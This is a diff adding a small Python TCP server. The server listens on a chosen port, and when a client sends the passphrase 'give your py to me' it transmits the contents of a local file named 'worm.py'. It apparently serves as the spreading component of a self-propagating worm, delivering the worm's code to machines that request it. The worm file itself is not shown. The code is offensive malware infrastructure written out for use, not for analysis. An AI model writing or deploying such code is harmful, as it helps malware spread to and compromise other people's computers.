@@ -1,0 +1,29 @@
+#!/usr/bin/env python3
+
+import socket
+import sys
+
+if __name__ == '__main__':
+    
+    host = "0.0.0.0"
+    port = int(sys.argv[1])
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((host, port))
+    s.listen(1)
+
+    try:
+        while True:
+            conn, addr = s.accept() 
+            data = conn.recv(1024)
+            
+            if data.decode() == "give your py to me":    
+                with open("worm.py", "r") as file:
+                    encode_data = file.read().encode()
+                    conn.sendall(encode_data)
+
+    except (KeyboardInterrupt):
+        print("Shutting down server")
+        s.close()
+        conn.close()
